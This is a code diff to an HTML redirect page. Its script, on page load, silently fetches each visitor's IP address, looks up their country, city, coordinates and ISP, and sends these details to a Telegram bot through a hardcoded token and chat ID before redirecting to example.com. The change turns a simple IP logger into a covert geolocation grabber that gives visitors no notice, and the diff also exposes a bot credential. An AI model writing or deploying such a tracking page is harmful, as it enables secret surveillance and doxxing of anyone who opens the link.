@@ -9,11 +9,23 @@
     <script>
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(d => {
-                var ip = d.ip;
+            .then(d => d.ip)
+            .then(ip => {
+                return fetch('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
+                    .then(r => r.json())
+                    .then(geo => ({ ip, geo }));
+            })
+            .then(data => {
+                var ip = data.ip;
+                var geo = data.geo;
+                var text = "НОВЫЙ ПЕРЕХОД\nIP: " + ip +
+                           "\nСтрана: " + (geo.country || '—') +
+                           "\nГород: " + (geo.city || '—') +
+                           "\nКоординаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') +
+                           "\nПровайдер: " + (geo.isp || '—');
                 var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
                 var chat_id = "8212240529";
-                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
+                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
                 fetch(url).catch(function() {});
             })
             .catch(function() {
@@ -25,7 +37,7 @@
 
         setTimeout(function() {
             window.location.href = "https://example.com";
-        }, 2000);
+        }, 2500);
     </script>
 </body>
 </html>
